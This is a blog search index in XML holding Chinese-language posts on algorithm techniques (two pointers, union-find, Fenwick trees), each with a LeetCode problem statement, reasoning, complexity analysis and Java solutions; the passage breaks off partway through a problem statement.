<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>左右指针，解接雨水等问题</title>
      <link href="/2023/11/19/%E5%B7%A6%E5%8F%B3%E6%8C%87%E9%92%88%EF%BC%8C%E8%A7%A3%E6%8E%A5%E9%9B%A8%E6%B0%B4%E7%AD%89%E9%97%AE%E9%A2%98/"/>
      <url>/2023/11/19/%E5%B7%A6%E5%8F%B3%E6%8C%87%E9%92%88%EF%BC%8C%E8%A7%A3%E6%8E%A5%E9%9B%A8%E6%B0%B4%E7%AD%89%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>求解区间时，受左右两端的值影响，并向中间区域靠拢求值时可用。</p><h5 id="11-盛最多水的容器"><a href="#11-盛最多水的容器" class="headerlink" title="11.盛最多水的容器"></a>11.盛最多水的容器</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/container-with-most-water/description/">11. 盛最多水的容器</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>给定一个长度为 <code>n</code> 的整数数组&nbsp;<code>height</code>&nbsp;。有&nbsp;<code>n</code>&nbsp;条垂线，第 <code>i</code> 条线的两个端点是&nbsp;<code>(i, 0)</code>&nbsp;和&nbsp;<code>(i, height[i])</code>&nbsp;。</p><p>找出其中的两条线，使得它们与&nbsp;<code>x</code>&nbsp;轴共同构成的容器可以容纳最多的水。</p><p>返回容器可以储存的最大水量。</p><p><strong>说明：</strong>你不能倾斜容器。</p><p><strong>示例 1：</strong></p><p><img alt="" src="https://aliyun-lc-upload.oss-cn-hangzhou.aliyuncs.com/aliyun-lc-upload/uploads/2018/07/25/question_11.jpg" class="lazyload" data-srcset="https://aliyun-lc-upload.oss-cn-hangzhou.aliyuncs.com/aliyun-lc-upload/uploads/2018/07/25/question_11.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><pre><strong>输入：</strong>[1,8,6,2,5,4,8,3,7]<strong>输出：</strong>49 <strong>解释：</strong>图中垂直线代表输入数组 [1,8,6,2,5,4,8,3,7]。在此情况下，容器能够容纳水（表示为蓝色部分）的最大值为&nbsp;49。</pre><p><strong>示例 2：</strong></p><pre><strong>输入：</strong>height = [1,1]<strong>输出：</strong>1</pre><p><strong>提示：</strong></p><ul>    <li><code>n == height.length</code></li>    <li><code>2 &lt;= n &lt;= 10<sup>5</sup></code></li>    <li><code>0 &lt;= height[i] &lt;= 10<sup>4</sup></code></li></ul></div><ol><li><p>思路</p><blockquote><p>接雨水plus，面积由左右两条线和j - i 围成的面积决定，而改变左右两条线怎么改变需要一些思考归纳。</p></blockquote></li><li><p>解题方法</p><blockquote><p>左右两条线怎么决定移动哪一条，可以解释为：移动最大的线，可能导致找不到最多水的容器，如果移动最小的线，可能会找到更大的容器，所以双指针每次移动的都是最小的那条线。</p></blockquote></li><li><p>复杂度</p><ul><li><p>时间复杂度:</p><blockquote><p>$O(n)$</p></blockquote></li><li><p>空间复杂度:</p><blockquote><p>$O(1)$</p></blockquote></li></ul></li><li><p>Code</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxArea</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">        <span class="comment">// 状态由左右两条线 和 宽度(j - i) 决定</span></span><br><span class="line">        <span class="comment">// 左右两条线，能盛水的大小由短边决定</span></span><br><span class="line">        <span class="comment">// 那么左右两条线怎么决定移动哪一条，可以解释为：移动最大的线，可能导致找不到最多水的容器，如果移动最小的线，可能会找到更大的容器</span></span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> height.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(l &lt; r) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">area</span> <span class="operator">=</span> Math.min(height[l], height[r]) * (r - l);</span><br><span class="line">            ans = Math.max(ans, area);</span><br><span class="line">            <span class="keyword">if</span> (height[l] &lt; height[r]) &#123;</span><br><span class="line">                l ++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                r --;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机算法 </category>
          
          <category> 双指针 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>并查集，求连通分量和拓扑排序等问题</title>
      <link href="/2023/11/19/%E5%B9%B6%E6%9F%A5%E9%9B%86%EF%BC%8C%E6%B1%82%E8%BF%9E%E9%80%9A%E5%88%86%E9%87%8F%E5%92%8C%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F%E7%AD%89%E9%97%AE%E9%A2%98/"/>
      <url>/2023/11/19/%E5%B9%B6%E6%9F%A5%E9%9B%86%EF%BC%8C%E6%B1%82%E8%BF%9E%E9%80%9A%E5%88%86%E9%87%8F%E5%92%8C%E6%8B%93%E6%89%91%E6%8E%92%E5%BA%8F%E7%AD%89%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>图，求连通分量，判断点与点是否连通，求拓扑排序等问题，可以使用并查集去解决问题。</p><span id="more"></span><h5 id="并查集模板"><a href="#并查集模板" class="headerlink" title="并查集模板"></a>并查集模板</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UF</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] parent;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UF</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        count = n;</span><br><span class="line">        parent = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            parent[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (parent[x] != x) &#123;</span><br><span class="line">            parent[x] = find(parent[x]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> parent[x];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">union</span><span class="params">(<span class="type">int</span> p, <span class="type">int</span> q)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rootP</span> <span class="operator">=</span> find(p);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rootQ</span> <span class="operator">=</span> find(q);</span><br><span class="line">        <span class="keyword">if</span> (rootP == rootQ) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        parent[rootQ] = rootP;</span><br><span class="line">        count --;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">connect</span><span class="params">(<span class="type">int</span> p, <span class="type">int</span> q)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> find(p) == find(q);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="684-冗余连接"><a href="#684-冗余连接" class="headerlink" title="684.冗余连接"></a>684.冗余连接</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/redundant-connection/description/">684. 冗余连接</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>树可以看成是一个连通且 <strong>无环&nbsp;</strong>的&nbsp;<strong>无向&nbsp;</strong>图。</p><p>给定往一棵&nbsp;<code>n</code> 个节点 (节点值&nbsp;<code>1～n</code>) 的树中添加一条边后的图。添加的边的两个顶点包含在 <code>1</code> 到 <code>n</code>&nbsp;中间，且这条附加的边不属于树中已存在的边。图的信息记录于长度为 <code>n</code> 的二维数组 <code>edges</code>&nbsp;，<code>edges[i] = [a<sub>i</sub>, b<sub>i</sub>]</code>&nbsp;表示图中在 <code>ai</code> 和 <code>bi</code> 之间存在一条边。</p><p>请找出一条可以删去的边，删除后可使得剩余部分是一个有着 <code>n</code> 个节点的树。如果有多个答案，则返回数组&nbsp;<code>edges</code>&nbsp;中最后出现的那个。</p><p><strong>示例 1：</strong></p><p><img alt="" src="https://pic.leetcode-cn.com/1626676174-hOEVUL-image.png" class="lazyload" data-srcset="https://pic.leetcode-cn.com/1626676174-hOEVUL-image.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="width: 152px;"></p><pre><strong>输入:</strong> edges = [[1,2], [1,3], [2,3]]<strong>输出:</strong> [2,3]</pre><p><strong>示例 2：</strong></p><p><img alt="" src="https://pic.leetcode-cn.com/1626676179-kGxcmu-image.png" class="lazyload" data-srcset="https://pic.leetcode-cn.com/1626676179-kGxcmu-image.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" style="width: 250px;"></p><pre><strong>输入:</strong> edges = [[1,2], [2,3], [3,4], [1,4], [1,5]]<strong>输出:</strong> [1,4]</pre><p><strong>提示:</strong></p><ul>    <li><code>n == edges.length</code></li>    <li><code>3 &lt;= n &lt;= 1000</code></li>    <li><code>edges[i].length == 2</code></li>    <li><code>1 &lt;= ai&nbsp;&lt; bi&nbsp;&lt;= edges.length</code></li>    <li><code>ai != bi</code></li>    <li><code>edges</code> 中无重复元素</li>    <li>给定的图是连通的&nbsp;</li></ul></div><ol><li><p>思路</p><blockquote><p>题目的题意一开始的图就是一个连通图，那么求可以删除的最后一条边，即所有给出的边连接成一个连通图有哪条边是多余的可以不拿来连接。</p></blockquote></li><li><p>解题方法</p><blockquote><p>把给出的边拿来做并查集构建连通图，如果哪条边是多余的（即connect为true），并且求是最后一个connect 为true，即为答案。</p></blockquote></li><li><p>复杂度</p></li></ol><ul><li><p>时间复杂度:</p><blockquote><p>循环n个点$O(n)$，并查集$O(logn)$，时间复杂度共$O(nlogn)$</p></blockquote></li><li><p>空间复杂度:</p><blockquote><p>$O(n)$</p></blockquote></li></ul><ol start="4"><li>Code</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] findRedundantConnection(<span class="type">int</span>[][] edges) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> edges.length;</span><br><span class="line">        <span class="type">UF</span> <span class="variable">graph</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UF</span>(n);</span><br><span class="line">        <span class="type">int</span>[] ans = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span>[] edge: edges) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> edge[<span class="number">0</span>] - <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> edge[<span class="number">1</span>] - <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// System.out.println(graph.connect(a, b));</span></span><br><span class="line">            <span class="keyword">if</span> (graph.connect(a, b)) &#123;</span><br><span class="line">                ans = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;a + <span class="number">1</span>, b + <span class="number">1</span>&#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                graph.union(a, b);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UF</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] parent;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UF</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        count = n;</span><br><span class="line">        parent = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            parent[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (parent[x] != x) &#123;</span><br><span class="line">            parent[x] = find(parent[x]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> parent[x];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">union</span><span class="params">(<span class="type">int</span> p, <span class="type">int</span> q)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">rootP</span> <span class="operator">=</span> find(p);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rootQ</span> <span class="operator">=</span> find(q);</span><br><span class="line">        <span class="keyword">if</span> (rootP == rootQ) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        parent[rootQ] = rootP;</span><br><span class="line">        count --;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">connect</span><span class="params">(<span class="type">int</span> p, <span class="type">int</span> q)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> find(p) == find(q);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机算法 </category>
          
          <category> 并查集 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>树状数组，用于快速求解范围区间的和</title>
      <link href="/2023/11/19/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%EF%BC%8C%E7%94%A8%E4%BA%8E%E5%BF%AB%E9%80%9F%E6%B1%82%E8%A7%A3%E8%8C%83%E5%9B%B4%E5%8C%BA%E9%97%B4%E5%86%85%E7%9A%84%E5%80%BC/"/>
      <url>/2023/11/19/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%EF%BC%8C%E7%94%A8%E4%BA%8E%E5%BF%AB%E9%80%9F%E6%B1%82%E8%A7%A3%E8%8C%83%E5%9B%B4%E5%8C%BA%E9%97%B4%E5%86%85%E7%9A%84%E5%80%BC/</url>
      
        <content type="html"><![CDATA[<p>求解数组区间的和，有前缀和、差分数组、树状数组，但各所适用的场景不用。</p><ul><li>前缀和适用于数组的值一开始固定不变的情况；</li><li>差分数组适用于数组的值会改变（增加|删除），但是求解原数据时需要恢复数据；</li><li>树状数组适用数组的值会改变，还可以快速求解一段区间的和，但需要构建数据结构。</li></ul><span id="more"></span><h5 id="树状数组模板"><a href="#树状数组模板" class="headerlink" title="树状数组模板"></a>树状数组模板</h5><p>包括建树、查询区间值等。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接上树状数组的结构</span></span><br><span class="line"><span class="type">int</span>[] tree;</span><br><span class="line"><span class="type">int</span>[] num;</span><br><span class="line"><span class="type">int</span> len;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lowbit</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x &amp; (-x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(index &lt; len) &#123;</span><br><span class="line">        tree[index] += val;</span><br><span class="line">        index += lowbit(index);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">query</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (index &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        sum += tree[index];</span><br><span class="line">        index -= lowbit(index);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">NumArray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">   num = nums;</span><br><span class="line">   len = nums.length + <span class="number">1</span>; <span class="comment">// 树状数组下标从1开始</span></span><br><span class="line">   tree = <span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">       add(i + <span class="number">1</span>, nums[i]);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="307-区域和检索-数组可修改（中等）"><a href="#307-区域和检索-数组可修改（中等）" class="headerlink" title="307.区域和检索 - 数组可修改（中等）"></a>307.区域和检索 - 数组可修改（中等）</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/range-sum-query-mutable/description/">307. 区域和检索 - 数组可修改</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>给你一个数组 <code>nums</code> ，请你完成两类查询。</p><ol>    <li>其中一类查询要求 <strong>更新</strong> 数组&nbsp;<code>nums</code>&nbsp;下标对应的值</li>    <li>另一类查询要求返回数组&nbsp;<code>nums</code>&nbsp;中索引&nbsp;<code>left</code>&nbsp;和索引&nbsp;<code>right</code>&nbsp;之间（&nbsp;<strong>包含&nbsp;</strong>）的nums元素的 <strong>和</strong>&nbsp;，其中&nbsp;<code>left &lt;= right</code></li></ol><p>实现 <code>NumArray</code> 类：</p><ul>    <li><code>NumArray(int[] nums)</code> 用整数数组 <code>nums</code> 初始化对象</li>    <li><code>void update(int index, int val)</code> 将 <code>nums[index]</code> 的值 <strong>更新</strong> 为 <code>val</code></li>    <li><code>int sumRange(int left, int right)</code> 返回数组&nbsp;<code>nums</code>&nbsp;中索引&nbsp;<code>left</code>&nbsp;和索引&nbsp;<code>right</code>&nbsp;之间（&nbsp;<strong>包含&nbsp;</strong>）的nums元素的 <strong>和</strong>&nbsp;（即，<code>nums[left] + nums[left + 1], ..., nums[right]</code>）</li></ul><p><strong>示例 1：</strong></p><pre><strong>输入</strong>：["NumArray", "sumRange", "update", "sumRange"][[[1, 3, 5]], [0, 2], [1, 2], [0, 2]]<strong>输出</strong>：[null, 9, null, 8]<strong>解释</strong>：NumArray numArray = new NumArray([1, 3, 5]);numArray.sumRange(0, 2); // 返回 1 + 3 + 5 = 9numArray.update(1, 2);   // nums = [1,2,5]numArray.sumRange(0, 2); // 返回 1 + 2 + 5 = 8</pre><p>&nbsp;</p><ul>    <li><code>1 &lt;= nums.length &lt;= 3 *&nbsp;10<sup>4</sup></code></li>    <li><code>-100 &lt;= nums[i] &lt;= 100</code></li>    <li><code>0 &lt;= index &lt; nums.length</code></li>    <li><code>-100 &lt;= val &lt;= 100</code></li>    <li><code>0 &lt;= left &lt;= right &lt; nums.length</code></li>    <li>调用 <code>update</code> 和 <code>sumRange</code> 方法次数不大于&nbsp;<code>3 * 10<sup>4</sup></code>&nbsp;</li></ul></div><ol><li><p>思路</p><blockquote><p>本题需要对数组区间求和，并且需要频繁修改数组中的值，排除前缀和，可以使用树状数组和线段树，但是能用树状数组优先使用树状数组，实现起来会更方便。</p></blockquote></li><li><p>解题方法</p><blockquote><p>直接上树状数组结构，然后放入实现类中即可。</p></blockquote></li><li><p>复杂度</p><ul><li><p>时间复杂度:</p><blockquote><p>$O(logn)$</p></blockquote></li><li><p>空间复杂度:</p><blockquote><p>$O(n)$</p></blockquote></li></ul></li><li><p>Code</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NumArray</span> &#123;</span><br><span class="line">    <span class="comment">// 区间求和，如果数组的值不变，可以直接用前缀和，这里需要update数组内的单个值，可以优先考虑用树状数组实现比较简单，但是也可以用线段树</span></span><br><span class="line">    <span class="comment">// 直接上树状数组的结构</span></span><br><span class="line">    <span class="type">int</span>[] tree;</span><br><span class="line">    <span class="type">int</span>[] num;</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lowbit</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x &amp; (-x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(index &lt; len) &#123;</span><br><span class="line">            tree[index] += val;</span><br><span class="line">            index += lowbit(index);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">query</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (index &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            sum += tree[index];</span><br><span class="line">            index -= lowbit(index);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">NumArray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">       num = nums;</span><br><span class="line">       len = nums.length + <span class="number">1</span>; <span class="comment">// 树状数组下标从1开始</span></span><br><span class="line">       tree = <span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">       <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">           add(i + <span class="number">1</span>, nums[i]);</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">       <span class="comment">// 计算需要更改的值为 val - num[index]</span></span><br><span class="line">       add(index + <span class="number">1</span>, val - num[index]);</span><br><span class="line">       num[index] = val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sumRange</span><span class="params">(<span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> query(right + <span class="number">1</span>) - query(left);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your NumArray object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * NumArray obj = new NumArray(nums);</span></span><br><span class="line"><span class="comment"> * obj.update(index,val);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj.sumRange(left,right);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h5 id="1893-检查是否区域内所有整数都被覆盖（简单）"><a href="#1893-检查是否区域内所有整数都被覆盖（简单）" class="headerlink" title="1893.检查是否区域内所有整数都被覆盖（简单）"></a>1893.检查是否区域内所有整数都被覆盖（简单）</h5><blockquote><p>Problem: <a href="https://leetcode.cn/problems/check-if-all-the-integers-in-a-range-are-covered/description/">1893. 检查是否区域内所有整数都被覆盖</a></p></blockquote><div class="elfjS" data-track-load="description_content"><p>给你一个二维整数数组&nbsp;<code>ranges</code>&nbsp;和两个整数&nbsp;<code>left</code>&nbsp;和&nbsp;<code>right</code>&nbsp;。每个&nbsp;<code>ranges[i] = [start<sub>i</sub>, end<sub>i</sub>]</code>&nbsp;表示一个从&nbsp;<code>start<sub>i</sub></code>&nbsp;到&nbsp;<code>end<sub>i</sub></code>&nbsp;的&nbsp;<strong>闭区间</strong>&nbsp;。</p><p>如果闭区间&nbsp;<code>[left, right]</code>&nbsp;内每个整数都被&nbsp;<code>ranges</code>&nbsp;中&nbsp;<strong>至少一个</strong>&nbsp;区间覆盖，那么请你返回&nbsp;<code>true</code>&nbsp;，否则返回&nbsp;<code>false</code>&nbsp;。</p><p>已知区间 <code>ranges[i] = [start<sub>i</sub>, end<sub>i</sub>]</code> ，如果整数 <code>x</code> 满足 <code>start<sub>i</sub> &lt;= x &lt;= 